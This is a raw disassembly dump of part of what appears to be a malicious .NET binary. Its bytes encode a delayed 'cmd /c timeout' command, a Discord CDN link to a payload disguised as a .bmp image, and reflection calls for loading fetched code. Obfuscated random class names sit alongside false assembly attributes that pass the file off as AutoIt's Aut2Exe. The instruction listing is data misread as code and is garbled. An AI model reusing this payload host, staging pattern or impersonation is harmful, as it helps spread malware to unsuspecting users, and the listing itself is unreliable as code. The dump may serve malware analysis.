  403127:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40312e:	73 74                	jae    0x4031a4
  403130:	65 6d                	gs insl (%dx),%es:(%edi)
  403132:	2e 52                	cs push %edx
  403134:	75 6e                	jne    0x4031a4
  403136:	74 69                	je     0x4031a1
  403138:	6d                   	insl   (%dx),%es:(%edi)
  403139:	65 2e 43             	gs cs inc %ebx
  40313c:	6f                   	outsl  %ds:(%esi),(%dx)
  40313d:	6d                   	insl   (%dx),%es:(%edi)
  40313e:	70 69                	jo     0x4031a9
  403140:	6c                   	insb   (%dx),%es:(%edi)
  403141:	65 72 53             	gs jb  0x403197
  403144:	65 72 76             	gs jb  0x4031bd
  403147:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40314e:	73 74                	jae    0x4031c4
  403150:	65 6d                	gs insl (%dx),%es:(%edi)
  403152:	2e 52                	cs push %edx
  403154:	65 73 6f             	gs jae 0x4031c6
  403157:	75 72                	jne    0x4031cb
  403159:	63 65 73             	arpl   %esp,0x73(%ebp)
  40315c:	00 47 6e             	add    %al,0x6e(%edi)
  40315f:	6c                   	insb   (%dx),%es:(%edi)
  403160:	67 77 2e             	addr16 ja 0x403191
  403163:	50                   	push   %eax
  403164:	72 6f                	jb     0x4031d5
  403166:	70 65                	jo     0x4031cd
  403168:	72 74                	jb     0x4031de
  40316a:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%ebp),%esp
  403171:	6f                   	outsl  %ds:(%esi),(%dx)
  403172:	75 72                	jne    0x4031e6
  403174:	63 65 73             	arpl   %esp,0x73(%ebp)
  403177:	2e 72 65             	jb,pn  0x4031df
  40317a:	73 6f                	jae    0x4031eb
  40317c:	75 72                	jne    0x4031f0
  40317e:	63 65 73             	arpl   %esp,0x73(%ebp)
  403181:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  403185:	75 67                	jne    0x4031ee
  403187:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40318e:	65 
  40318f:	73 00                	jae    0x403191
  403191:	47                   	inc    %edi
  403192:	6e                   	outsb  %ds:(%esi),(%dx)
  403193:	6c                   	insb   (%dx),%es:(%edi)
  403194:	67 77 2e             	addr16 ja 0x4031c5
  403197:	50                   	push   %eax
  403198:	72 6f                	jb     0x403209
  40319a:	70 65                	jo     0x403201
  40319c:	72 74                	jb     0x403212
  40319e:	69 65 73 00 4e 61 6d 	imul   $0x6d614e00,0x73(%ebp),%esp
  4031a5:	65 73 00             	gs jae 0x4031a8
  4031a8:	47                   	inc    %edi
  4031a9:	65 74 54             	gs je  0x403200
  4031ac:	79 70                	jns    0x40321e
  4031ae:	65 73 00             	gs jae 0x4031b1
  4031b1:	42                   	inc    %edx
  4031b2:	69 6e 64 69 6e 67 46 	imul   $0x46676e69,0x64(%esi),%ebp
  4031b9:	6c                   	insb   (%dx),%es:(%edi)
  4031ba:	61                   	popa
  4031bb:	67 73 00             	addr16 jae 0x4031be
  4031be:	53                   	push   %ebx
  4031bf:	65 74 74             	gs je  0x403236
  4031c2:	69 6e 67 73 00 61 72 	imul   $0x72610073,0x67(%esi),%ebp
  4031c9:	67 73 00             	addr16 jae 0x4031cc
  4031cc:	53                   	push   %ebx
  4031cd:	79 73                	jns    0x403242
  4031cf:	74 65                	je     0x403236
  4031d1:	6d                   	insl   (%dx),%es:(%edi)
  4031d2:	2e 57                	cs push %edi
  4031d4:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4031db:	46                   	inc    %esi
  4031dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4031dd:	72 6d                	jb     0x40324c
  4031df:	73 00                	jae    0x4031e1
  4031e1:	50                   	push   %eax
  4031e2:	72 6f                	jb     0x403253
  4031e4:	63 65 73             	arpl   %esp,0x73(%ebp)
  4031e7:	73 00                	jae    0x4031e9
  4031e9:	45                   	inc    %ebp
  4031ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4031eb:	6d                   	insl   (%dx),%es:(%edi)
  4031ec:	6c                   	insb   (%dx),%es:(%edi)
  4031ed:	68 6b 68 73 71       	push   $0x7173686b
  4031f2:	7a 6e                	jp     0x403262
  4031f4:	77 61                	ja     0x403257
  4031f6:	69 74 73 00 73 65 74 	imul   $0x5f746573,0x0(%ebx,%esi,2),%esi
  4031fd:	5f 
  4031fe:	41                   	inc    %ecx
  4031ff:	72 67                	jb     0x403268
  403201:	75 6d                	jne    0x403270
  403203:	65 6e                	outsb  %gs:(%esi),(%dx)
  403205:	74 73                	je     0x40327a
  403207:	00 63 6f             	add    %ah,0x6f(%ebx)
  40320a:	6d                   	insl   (%dx),%es:(%edi)
  40320b:	70 6f                	jo     0x40327c
  40320d:	6e                   	outsb  %ds:(%esi),(%dx)
  40320e:	65 6e                	outsb  %gs:(%esi),(%dx)
  403210:	74 73                	je     0x403285
  403212:	00 4f 62             	add    %cl,0x62(%edi)
  403215:	6a 65                	push   $0x65
  403217:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  40321b:	79 73                	jns    0x403290
  40321d:	74 65                	je     0x403284
  40321f:	6d                   	insl   (%dx),%es:(%edi)
  403220:	2e 4e                	cs dec %esi
  403222:	65 74 00             	gs je  0x403225
  403225:	67 65 74 5f          	addr16 gs je 0x403288
  403229:	44                   	inc    %esp
  40322a:	65 66 61             	gs popaw
  40322d:	75 6c                	jne    0x40329b
  40322f:	74 00                	je     0x403231
  403231:	46                   	inc    %esi
  403232:	69 72 73 74 4f 72 44 	imul   $0x44724f74,0x73(%edx),%esi
  403239:	65 66 61             	gs popaw
  40323c:	75 6c                	jne    0x4032aa
  40323e:	74 00                	je     0x403240
  403240:	49                   	dec    %ecx
  403241:	6e                   	outsb  %ds:(%esi),(%dx)
  403242:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  403249:	65 
  40324a:	43                   	inc    %ebx
  40324b:	6f                   	outsl  %ds:(%esi),(%dx)
  40324c:	6d                   	insl   (%dx),%es:(%edi)
  40324d:	70 6f                	jo     0x4032be
  40324f:	6e                   	outsb  %ds:(%esi),(%dx)
  403250:	65 6e                	outsb  %gs:(%esi),(%dx)
  403252:	74 00                	je     0x403254
  403254:	53                   	push   %ebx
  403255:	74 61                	je     0x4032b8
  403257:	72 74                	jb     0x4032cd
  403259:	00 48 74             	add    %cl,0x74(%eax)
  40325c:	74 70                	je     0x4032ce
  40325e:	57                   	push   %edi
  40325f:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  403263:	71 75                	jno    0x4032da
  403265:	65 73 74             	gs jae 0x4032dc
  403268:	00 67 65             	add    %ah,0x65(%edi)
  40326b:	74 5f                	je     0x4032cc
  40326d:	54                   	push   %esp
  40326e:	65 78 74             	gs js  0x4032e5
  403271:	00 73 65             	add    %dh,0x65(%ebx)
  403274:	74 5f                	je     0x4032d5
  403276:	54                   	push   %esp
  403277:	65 78 74             	gs js  0x4032ee
  40327a:	00 47 6e             	add    %al,0x6e(%edi)
  40327d:	6c                   	insb   (%dx),%es:(%edi)
  40327e:	67 77 00             	addr16 ja 0x403281
  403281:	42                   	inc    %edx
  403282:	6f                   	outsl  %ds:(%esi),(%dx)
  403283:	78 00                	js     0x403285
  403285:	54                   	push   %esp
  403286:	6f                   	outsl  %ds:(%esi),(%dx)
  403287:	41                   	inc    %ecx
  403288:	72 72                	jb     0x4032fc
  40328a:	61                   	popa
  40328b:	79 00                	jns    0x40328d
  40328d:	67 65 74 5f          	addr16 gs je 0x4032f0
  403291:	41                   	inc    %ecx
  403292:	73 73                	jae    0x403307
  403294:	65 6d                	gs insl (%dx),%es:(%edi)
  403296:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40329a:	6f                   	outsl  %ds:(%esi),(%dx)
  40329b:	70 5f                	jo     0x4032fc
  40329d:	45                   	inc    %ebp
  40329e:	71 75                	jno    0x403315
  4032a0:	61                   	popa
  4032a1:	6c                   	insb   (%dx),%es:(%edi)
  4032a2:	69 74 79 00 4e 63 78 	imul   $0x6a78634e,0x0(%ecx,%edi,2),%esi
  4032a9:	6a 
  4032aa:	74 7a                	je     0x403326
  4032ac:	00 00                	add    %al,(%eax)
  4032ae:	00 00                	add    %al,(%eax)
  4032b0:	00 0b                	add    %cl,(%ebx)
  4032b2:	46                   	inc    %esi
  4032b3:	00 6f 00             	add    %ch,0x0(%edi)
  4032b6:	72 00                	jb     0x4032b8
  4032b8:	6d                   	insl   (%dx),%es:(%edi)
  4032b9:	00 31                	add    %dh,(%ecx)
  4032bb:	00 00                	add    %al,(%eax)
  4032bd:	07                   	pop    %es
  4032be:	63 00                	arpl   %eax,(%eax)
  4032c0:	6d                   	insl   (%dx),%es:(%edi)
  4032c1:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4032c5:	33 2f                	xor    (%edi),%ebp
  4032c7:	00 63 00             	add    %ah,0x0(%ebx)
  4032ca:	20 00                	and    %al,(%eax)
  4032cc:	74 00                	je     0x4032ce
  4032ce:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  4032d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d5:	00 75 00             	add    %dh,0x0(%ebp)
  4032d8:	74 00                	je     0x4032da
  4032da:	20 00                	and    %al,(%eax)
  4032dc:	2f                   	das
  4032dd:	00 6e 00             	add    %ch,0x0(%esi)
  4032e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032e1:	00 62 00             	add    %ah,0x0(%edx)
  4032e4:	72 00                	jb     0x4032e6
  4032e6:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4032ea:	6b 00 20             	imul   $0x20,(%eax),%eax
  4032ed:	00 2f                	add    %ch,(%edi)
  4032ef:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  4032f3:	00 32                	add    %dh,(%edx)
  4032f5:	00 30                	add    %dh,(%eax)
  4032f7:	00 00                	add    %al,(%eax)
  4032f9:	80 c1 68             	add    $0x68,%cl
  4032fc:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  403300:	00 70 00             	add    %dh,0x0(%eax)
  403303:	73 00                	jae    0x403305
  403305:	3a 00                	cmp    (%eax),%al
  403307:	2f                   	das
  403308:	00 2f                	add    %ch,(%edi)
  40330a:	00 63 00             	add    %ah,0x0(%ebx)
  40330d:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  403311:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  403316:	00 73 00             	add    %dh,0x0(%ebx)
  403319:	63 00                	arpl   %eax,(%eax)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	00 72 00             	add    %dh,0x0(%edx)
  40331f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  403323:	70 00                	jo     0x403325
  403325:	70 00                	jo     0x403327
  403327:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40332b:	6f                   	outsl  %ds:(%esi),(%dx)
  40332c:	00 6d 00             	add    %ch,0x0(%ebp)
  40332f:	2f                   	das
  403330:	00 61 00             	add    %ah,0x0(%ecx)
  403333:	74 00                	je     0x403335
  403335:	74 00                	je     0x403337
  403337:	61                   	popa
  403338:	00 63 00             	add    %ah,0x0(%ebx)
  40333b:	68 00 6d 00 65       	push   $0x65006d00
  403340:	00 6e 00             	add    %ch,0x0(%esi)
  403343:	74 00                	je     0x403345
  403345:	73 00                	jae    0x403347
  403347:	2f                   	das
  403348:	00 39                	add    %bh,(%ecx)
  40334a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40334d:	37                   	aaa
  40334e:	00 30                	add    %dh,(%eax)
  403350:	00 38                	add    %bh,(%eax)
  403352:	00 31                	add    %dh,(%ecx)
  403354:	00 32                	add    %dh,(%edx)
  403356:	00 35 00 34 00 31    	add    %dh,0x31003400
  40335c:	00 37                	add    %dh,(%edi)
  40335e:	00 30                	add    %dh,(%eax)
  403360:	00 34 00             	add    %dh,(%eax,%eax,1)
  403363:	32 00                	xor    (%eax),%al
  403365:	33 00                	xor    (%eax),%eax
  403367:	33 00                	xor    (%eax),%eax
  403369:	32 00                	xor    (%eax),%al
  40336b:	38 00                	cmp    %al,(%eax)
  40336d:	2f                   	das
  40336e:	00 39                	add    %bh,(%ecx)
  403370:	00 38                	add    %bh,(%eax)
  403372:	00 30                	add    %dh,(%eax)
  403374:	00 32                	add    %dh,(%edx)
  403376:	00 30                	add    %dh,(%eax)
  403378:	00 33                	add    %dh,(%ebx)
  40337a:	00 36                	add    %dh,(%esi)
  40337c:	00 38                	add    %bh,(%eax)
  40337e:	00 36                	add    %dh,(%esi)
  403380:	00 32                	add    %dh,(%edx)
  403382:	00 35 00 35 00 30    	add    %dh,0x30003500
  403388:	00 31                	add    %dh,(%ecx)
  40338a:	00 33                	add    %dh,(%ebx)
  40338c:	00 39                	add    %bh,(%ecx)
  40338e:	00 38                	add    %bh,(%eax)
  403390:	00 39                	add    %bh,(%ecx)
  403392:	00 2f                	add    %ch,(%edi)
  403394:	00 4e 00             	add    %cl,0x0(%esi)
  403397:	63 00                	arpl   %eax,(%eax)
  403399:	78 00                	js     0x40339b
  40339b:	6a 00                	push   $0x0
  40339d:	74 00                	je     0x40339f
  40339f:	7a 00                	jp     0x4033a1
  4033a1:	5f                   	pop    %edi
  4033a2:	00 57 00             	add    %dl,0x0(%edi)
  4033a5:	79 00                	jns    0x4033a7
  4033a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a8:	00 66 00             	add    %ah,0x0(%esi)
  4033ab:	6d                   	insl   (%dx),%es:(%edi)
  4033ac:	00 71 00             	add    %dh,0x0(%ecx)
  4033af:	71 00                	jno    0x4033b1
  4033b1:	78 00                	js     0x4033b3
  4033b3:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  4033b7:	6d                   	insl   (%dx),%es:(%edi)
  4033b8:	00 70 00             	add    %dh,0x0(%eax)
  4033bb:	00 4b 4b             	add    %cl,0x4b(%ebx)
  4033be:	00 68 00             	add    %ch,0x0(%eax)
  4033c1:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  4033c5:	76 00                	jbe    0x4033c7
  4033c7:	77 00                	ja     0x4033c9
  4033c9:	6a 00                	push   $0x0
  4033cb:	64 00 74 00 71       	add    %dh,%fs:0x71(%eax,%eax,1)
  4033d0:	00 72 00             	add    %dh,0x0(%edx)
  4033d3:	79 00                	jns    0x4033d5
  4033d5:	6d                   	insl   (%dx),%es:(%edi)
  4033d6:	00 6d 00             	add    %ch,0x0(%ebp)
  4033d9:	71 00                	jno    0x4033db
  4033db:	62 00                	bound  %eax,(%eax)
  4033dd:	75 00                	jne    0x4033df
  4033df:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  4033e3:	2e 00 5a 00          	add    %bl,%cs:0x0(%edx)
  4033e7:	73 00                	jae    0x4033e9
  4033e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4033ea:	00 6d 00             	add    %ch,0x0(%ebp)
  4033ed:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  4033f1:	69 00 65 00 77 00    	imul   $0x770065,(%eax),%eax
  4033f7:	73 00                	jae    0x4033f9
  4033f9:	77 00                	ja     0x4033fb
  4033fb:	73 00                	jae    0x4033fd
  4033fd:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  403401:	6a 00                	push   $0x0
  403403:	6b 00 73             	imul   $0x73,(%eax),%eax
  403406:	00 00                	add    %al,(%eax)
  403408:	2d 45 00 75 00       	sub    $0x750045,%eax
  40340d:	75 00                	jne    0x40340f
  40340f:	78 00                	js     0x403411
  403411:	68 00 76 00 6c       	push   $0x6c007600
  403416:	00 67 00             	add    %ah,0x0(%edi)
  403419:	63 00                	arpl   %eax,(%eax)
  40341b:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40341f:	68 00 63 00 78       	push   $0x78006300
  403424:	00 6a 00             	add    %ch,0x0(%edx)
  403427:	68 00 72 00 79       	push   $0x79007200
  40342c:	00 69 00             	add    %ch,0x0(%ecx)
  40342f:	6d                   	insl   (%dx),%es:(%edi)
  403430:	00 6d 00             	add    %ch,0x0(%ebp)
  403433:	63 00                	arpl   %eax,(%eax)
  403435:	00 35 47 00 6e 00    	add    %dh,0x6e0047
  40343b:	6c                   	insb   (%dx),%es:(%edi)
  40343c:	00 67 00             	add    %ah,0x0(%edi)
  40343f:	77 00                	ja     0x403441
  403441:	2e 00 50 00          	add    %dl,%cs:0x0(%eax)
  403445:	72 00                	jb     0x403447
  403447:	6f                   	outsl  %ds:(%esi),(%dx)
  403448:	00 70 00             	add    %dh,0x0(%eax)
  40344b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40344f:	74 00                	je     0x403451
  403451:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  403457:	2e 00 52 00          	add    %dl,%cs:0x0(%edx)
  40345b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40345f:	6f                   	outsl  %ds:(%esi),(%dx)
  403460:	00 75 00             	add    %dh,0x0(%ebp)
  403463:	72 00                	jb     0x403465
  403465:	63 00                	arpl   %eax,(%eax)
  403467:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40346b:	00 1c b7             	add    %bl,(%edi,%esi,4)
  40346e:	b0 7a                	mov    $0x7a,%al
  403470:	6f                   	outsl  %ds:(%esi),(%dx)
  403471:	65 8e 44 96 ed       	mov    %gs:-0x13(%esi,%edx,4),%es
  403476:	6d                   	insl   (%dx),%es:(%edi)
  403477:	10 1f                	adc    %bl,(%edi)
  403479:	19 77 27             	sbb    %esi,0x27(%edi)
  40347c:	00 04 20             	add    %al,(%eax,%eiz,1)
  40347f:	01 01                	add    %eax,(%ecx)
  403481:	08 03                	or     %al,(%ebx)
  403483:	20 00                	and    %al,(%eax)
  403485:	01 05 20 01 01 11    	add    %eax,0x11010120
  40348b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40348e:	01 01                	add    %eax,(%ecx)
  403490:	0e                   	push   %cs
  403491:	04 20                	add    $0x20,%al
  403493:	01 01                	add    %eax,(%ecx)
  403495:	02 05 20 02 01 0e    	add    0xe010220,%al
  40349b:	0e                   	push   %cs
  40349c:	06                   	push   %es
  40349d:	20 01                	and    %al,(%ecx)
  40349f:	01 11                	add    %edx,(%ecx)
  4034a1:	80 85 03 07 01 02 06 	addb   $0x6,0x2010703(%ebp)
  4034a8:	20 01                	and    %al,(%ecx)
  4034aa:	01 11                	add    %edx,(%ecx)
  4034ac:	80 9d 05 20 02 01 08 	sbbb   $0x8,0x1022005(%ebp)
  4034b3:	08 06                	or     %al,(%esi)
  4034b5:	20 01                	and    %al,(%ecx)
  4034b7:	01 11                	add    %edx,(%ecx)
  4034b9:	80 a1 09 07 04 1d 05 	andb   $0x5,0x1d040709(%ecx)
  4034c0:	12 51 02             	adc    0x2(%ecx),%dl
  4034c3:	1d 05 05 20 00       	sbb    $0x200505,%eax
  4034c8:	12 80 a9 06 20 01    	adc    0x12006a9(%eax),%al
  4034ce:	01 11                	add    %edx,(%ecx)
  4034d0:	80 ad 03 20 00 02 08 	subb   $0x8,0x2002003(%ebp)
  4034d7:	00 03                	add    %al,(%ebx)
  4034d9:	01 12                	add    %edx,(%edx)
  4034db:	80 b1 08 08 08 07 03 	xorb   $0x3,0x7080808(%ecx)
  4034e2:	12 55 1d             	adc    0x1d(%ebp),%dl
  4034e5:	05 1d 05 05 20       	add    $0x2005051d,%eax
  4034ea:	01 01                	add    %eax,(%ecx)
  4034ec:	12 59 04             	adc    0x4(%ecx),%bl
  4034ef:	20 00                	and    %al,(%eax)
  4034f1:	1d 05 0a 07 04       	sbb    $0x4070a05,%eax
  4034f6:	12 5d 12             	adc    0x12(%ebp),%bl
  4034f9:	61                   	popa
  4034fa:	12 59 12             	adc    0x12(%ecx),%bl
  4034fd:	59                   	pop    %ecx
  4034fe:	06                   	push   %es
  4034ff:	00 01                	add    %al,(%ecx)
  403501:	01 11                	add    %edx,(%ecx)
  403503:	80 b9 06 00 01 12 80 	cmpb   $0x80,0x12010006(%ecx)
  40350a:	bd 0e 05 20 00       	mov    $0x20050e,%ebp
  40350f:	12 80 c1 04 20 00    	adc    0x2004c1(%eax),%al
  403515:	12 59 04             	adc    0x4(%ecx),%bl
  403518:	07                   	pop    %es
  403519:	01 12                	add    %edx,(%edx)
  40351b:	65 06                	gs push %es
  40351d:	00 01                	add    %al,(%ecx)
  40351f:	12 65 1d             	adc    0x1d(%ebp),%ah
  403522:	05 0b 07 06 12       	add    $0x1206070b,%eax
  403527:	65 02 12             	add    %gs:(%edx),%dl
  40352a:	69 02 12 6d 02 07    	imul   $0x7026d12,(%edx),%eax
  403530:	00 02                	add    %al,(%edx)
  403532:	02 12                	add    (%edx),%dl
  403534:	65 12 65 05          	adc    %gs:0x5(%ebp),%ah
  403538:	20 00                	and    %al,(%eax)
  40353a:	1d 12 69 08 15       	sbb    $0x15086912,%eax
  40353f:	12 80 c9 02 12 69    	adc    0x691202c9(%eax),%al
  403545:	02 05 20 02 01 1c    	add    0x1c010220,%al
  40354b:	18 14 10             	sbb    %dl,(%eax,%edx,1)
  40354e:	01 02                	add    %eax,(%edx)
  403550:	1e                   	push   %ds
  403551:	00 15 12 80 d1 01    	add    %dl,0x1d18012
  403557:	1e                   	push   %ds
  403558:	00 15 12 80 c9 02    	add    %dl,0x2c98012
  40355e:	1e                   	push   %ds
  40355f:	00 02                	add    %al,(%edx)
  403561:	04 0a                	add    $0xa,%al
  403563:	01 12                	add    %edx,(%edx)
  403565:	69 07 00 02 02 12    	imul   $0x12020200,(%edi),%eax
  40356b:	69 12 69 05 20 00    	imul   $0x200569,(%edx),%edx
  403571:	1d 12 6d 08 15       	sbb    $0x15086d12,%eax
  403576:	12 80 c9 02 12 6d    	adc    0x6d1202c9(%eax),%al
  40357c:	02 04 0a             	add    (%edx,%ecx,1),%al
  40357f:	01 12                	add    %edx,(%edx)
  403581:	6d                   	insl   (%dx),%es:(%edi)
  403582:	07                   	pop    %es
  403583:	00 02                	add    %al,(%edx)
  403585:	02 12                	add    (%edx),%dl
  403587:	6d                   	insl   (%dx),%es:(%edi)
  403588:	12 6d 03             	adc    0x3(%ebp),%ch
  40358b:	20 00                	and    %al,(%eax)
  40358d:	0e                   	push   %cs
  40358e:	0d 20 05 1c 0e       	or     $0xe1c0520,%eax
  403593:	11 80 d9 12 80 dd    	adc    %eax,-0x227fed27(%eax)
  403599:	1c 1d                	sbb    $0x1d,%al
  40359b:	1c 05                	sbb    $0x5,%al
  40359d:	00 02                	add    %al,(%edx)
  40359f:	02 0e                	add    (%esi),%cl
  4035a1:	0e                   	push   %cs
  4035a2:	07                   	pop    %es
  4035a3:	07                   	pop    %es
  4035a4:	03 02                	add    (%edx),%eax
  4035a6:	12 7d 12             	adc    0x12(%ebp),%bh
  4035a9:	7d 07                	jge    0x4035b2
  4035ab:	00 01                	add    %al,(%ecx)
  4035ad:	12 69 11             	adc    0x11(%ecx),%ch
  4035b0:	80 e5 04             	and    $0x4,%ch
  4035b3:	20 00                	and    %al,(%eax)
  4035b5:	12 65 06             	adc    0x6(%ebp),%ah
  4035b8:	20 02                	and    %al,(%edx)
  4035ba:	01 0e                	add    %ecx,(%esi)
  4035bc:	12 65 05             	adc    0x5(%ebp),%ah
  4035bf:	07                   	pop    %es
  4035c0:	01 12                	add    %edx,(%edx)
  4035c2:	80 81 04 07 01 12 18 	addb   $0x18,0x12010704(%ecx)
  4035c9:	08 00                	or     %al,(%eax)
  4035cb:	01 12                	add    %edx,(%edx)
  4035cd:	80 e9 12             	sub    $0x12,%cl
  4035d0:	80 e9 08             	sub    $0x8,%cl
  4035d3:	b7 7a                	mov    $0x7a,%bh
  4035d5:	5c                   	pop    %esp
  4035d6:	56                   	push   %esi
  4035d7:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4035da:	89 08                	mov    %ecx,(%eax)
  4035dc:	b0 3f                	mov    $0x3f,%al
  4035de:	5f                   	pop    %edi
  4035df:	7f 11                	jg     0x4035f2
  4035e1:	d5 0a                	aad    $0xa
  4035e3:	3a 03                	cmp    (%ebx),%al
  4035e5:	06                   	push   %es
  4035e6:	12 4d 03             	adc    0x3(%ebp),%cl
  4035e9:	06                   	push   %es
  4035ea:	12 7d 04             	adc    0x4(%ebp),%bh
  4035ed:	06                   	push   %es
  4035ee:	12 80 81 03 06 12    	adc    0x12060381(%eax),%al
  4035f4:	18 05 00 01 01 1d    	sbb    %al,0x1d010100
  4035fa:	0e                   	push   %cs
  4035fb:	06                   	push   %es
  4035fc:	20 01                	and    %al,(%ecx)
  4035fe:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
  403603:	20 01                	and    %al,(%ecx)
  403605:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
  40360a:	01 12                	add    %edx,(%edx)
  40360c:	59                   	pop    %ecx
  40360d:	0e                   	push   %cs
  40360e:	05 20 01 02 12       	add    $0x12020120,%eax
  403613:	69 05 20 01 02 12 6d 	imul   $0x46d,0x12020120,%eax
  40361a:	04 00 00 
  40361d:	12 7d 05             	adc    0x5(%ebp),%bh
  403620:	00 00                	add    %al,(%eax)
  403622:	12 80 81 06 00 01    	adc    0x1000681(%eax),%al
  403628:	01 12                	add    %edx,(%edx)
  40362a:	80 81 04 00 00 12 18 	addb   $0x18,0x12000004(%ecx)
  403631:	03 00                	add    (%eax),%eax
  403633:	00 01                	add    %al,(%ecx)
  403635:	04 08                	add    $0x8,%al
  403637:	00 12                	add    %dl,(%edx)
  403639:	7d 05                	jge    0x403640
  40363b:	08 00                	or     %al,(%eax)
  40363d:	12 80 81 04 08 00    	adc    0x80481(%eax),%al
  403643:	12 18                	adc    (%eax),%bl
  403645:	08 01                	or     %al,(%ecx)
  403647:	00 08                	add    %cl,(%eax)
  403649:	00 00                	add    %al,(%eax)
  40364b:	00 00                	add    %al,(%eax)
  40364d:	00 1e                	add    %bl,(%esi)
  40364f:	01 00                	add    %eax,(%eax)
  403651:	01 00                	add    %eax,(%eax)
  403653:	54                   	push   %esp
  403654:	02 16                	add    (%esi),%dl
  403656:	57                   	push   %edi
  403657:	72 61                	jb     0x4036ba
  403659:	70 4e                	jo     0x4036a9
  40365b:	6f                   	outsl  %ds:(%esi),(%dx)
  40365c:	6e                   	outsb  %ds:(%esi),(%dx)
  40365d:	45                   	inc    %ebp
  40365e:	78 63                	js     0x4036c3
  403660:	65 70 74             	gs jo  0x4036d7
  403663:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40366a:	77 73                	ja     0x4036df
  40366c:	01 08                	add    %ecx,(%eax)
  40366e:	01 00                	add    %eax,(%eax)
  403670:	07                   	pop    %es
  403671:	01 00                	add    %eax,(%eax)
  403673:	00 00                	add    %al,(%eax)
  403675:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  403678:	00 07                	add    %al,(%edi)
  40367a:	41                   	inc    %ecx
  40367b:	75 74                	jne    0x4036f1
  40367d:	32 45 78             	xor    0x78(%ebp),%al
  403680:	65 00 00             	add    %al,%gs:(%eax)
  403683:	05 01 00 00 00       	add    $0x1,%eax
  403688:	00 10                	add    %dl,(%eax)
  40368a:	01 00                	add    %eax,(%eax)
  40368c:	0b 41 75             	or     0x75(%ecx),%eax
  40368f:	74 6f                	je     0x403700
  403691:	49                   	dec    %ecx
  403692:	74 20                	je     0x4036b4
  403694:	54                   	push   %esp
  403695:	65 61                	gs popa
  403697:	6d                   	insl   (%dx),%es:(%edi)
  403698:	00 00                	add    %al,(%eax)
  40369a:	30 01                	xor    %al,(%ecx)
  40369c:	00 2b                	add    %ch,(%ebx)
  40369e:	c2 a9 20             	ret    $0x20a9
  4036a1:	31 39                	xor    %edi,(%ecx)
  4036a3:	39 39                	cmp    %edi,(%ecx)
  4036a5:	2d 32 30 32 32       	sub    $0x32323032,%eax
  4036aa:	20 4a 6f             	and    %cl,0x6f(%edx)
  4036ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4036ae:	61                   	popa
  4036af:	74 68                	je     0x403719
  4036b1:	61                   	popa
  4036b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4036b3:	20 42 65             	and    %al,0x65(%edx)
  4036b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4036b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4036b8:	65 74 74             	gs je  0x40372f
  4036bb:	20 26                	and    %ah,(%esi)
  4036bd:	20 41 75             	and    %al,0x75(%ecx)
  4036c0:	74 6f                	je     0x403731
  4036c2:	49                   	dec    %ecx
  4036c3:	74 20                	je     0x4036e5
  4036c5:	54                   	push   %esp
  4036c6:	65 61                	gs popa
  4036c8:	6d                   	insl   (%dx),%es:(%edi)
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	29 01                	sub    %eax,(%ecx)
  4036cd:	00 24 36             	add    %ah,(%esi,%esi,1)
  4036d0:	32 36                	xor    (%esi),%dh
  4036d2:	65 39 65 36          	cmp    %esp,%gs:0x36(%ebp)
  4036d6:	35 2d 63 66 64       	xor    $0x6466632d,%eax
  4036db:	34 2d                	xor    $0x2d,%al
  4036dd:	34 35                	xor    $0x35,%al
  4036df:	66 62 2d 62 63 39 33 	bound  %bp,0x33396362
  4036e6:	2d 33 61 62 62       	sub    $0x62626133,%eax
  4036eb:	30 61 61             	xor    %ah,0x61(%ecx)
  4036ee:	34 35                	xor    $0x35,%al
  4036f0:	39 37                	cmp    %esi,(%edi)
  4036f2:	62 00                	bound  %eax,(%eax)
  4036f4:	00 0d 01 00 08 33    	add    %cl,0x33080001
  4036fa:	2e 33 2e             	xor    %cs:(%esi),%ebp
